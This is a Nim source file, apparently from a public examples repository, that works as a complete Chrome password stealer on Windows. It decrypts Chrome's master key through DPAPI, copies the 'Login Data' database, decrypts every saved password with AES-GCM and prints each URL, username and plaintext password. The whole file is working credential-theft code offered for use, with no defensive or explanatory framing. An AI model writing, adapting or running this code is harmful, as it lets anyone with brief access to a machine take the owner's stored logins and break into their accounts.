#[
Author: StudyCat
Blog: https://www.cnblogs.com/studycat
Github: https://github.com/StudyCat404/myNimExamples
License: BSD 3-Clause
]#

import os
import json
import base64
import winim/inc/wincrypt
import db_sqlite
import nimcrypto/[rijndael, bcmode]

proc cryptUnprotectData(data: openarray[byte]): string =
    var dataIn, dataOut: DATA_BLOB
    dataIn.cbData = int32(data.len)
    dataIn.pbData = unsafeaddr data[0]
    
    if CryptUnprotectData(addr dataIn, nil, nil, nil, nil, 0, addr dataOut) != 0:
        result.setLen(dataOut.cbData)
        if dataOut.cbData != 0:
            copyMem(addr result[0], dataOut.pbData, dataOut.cbData)   


proc getMasterKey(): string =
    let filename = getEnv("USERPROFILE") & r"\AppData\Local\Google\Chrome\User Data\Local State"
    if fileExists(filename):
        let contents = readFile(filename)
        let jsonNode = parseJson(contents)
        let masterKeyB64 = jsonNode["os_crypt"]["encrypted_key"].getStr()
        let decoded = decode(masterKeyB64)
        var masterKey = decoded.substr(5)
        result = cryptUnprotectData(toOpenArrayByte(masterKey, 0, masterKey.len() - 1 ))


proc passDecrypt(data: openarray[byte]): string =
    var key {.global.}: string
    
    if data[0..<3] == [byte 118, 49, 48]:   #chrome version > 80
        if key.len() == 0:
            key = getMasterKey()
            
        var
            ctx: GCM[aes256]
            aad: seq[byte]
            iv = data[3 ..< 3 + 12]
            encrypted = data[3 + 12 ..< data.len - 16]
            
        if encrypted.len() > 0:
            result.setLen(encrypted.len())
            ctx.init(key.toOpenArrayByte(0, key.len() - 1), iv, aad)
            ctx.decrypt(encrypted, result.toOpenArrayByte(0, result.len() - 1))
    else:
        result = cryptUnprotectData(data)   #chrome version < 80
        
proc main() =
    let filename = getEnv("USERPROFILE") & r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    let tempFileName = getTempDir() & "Login Data"
    copyFile(filename, tempFileName)
    if fileExists(tempFileName):
        let db = open(tempFileName, "", "", "")
        for row in db.fastRows(sql"SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS"):
            echo "URL: ", row[0]
            echo "USER: ", row[1]
            echo "PASS: ", passDecrypt(toOpenArrayByte(row[2], 0, row[2].len() - 1 ))
            echo ""
        db.close()
        
    removeFile(tempFileName)
    
when isMainModule:
    when defined(windows):
        main()       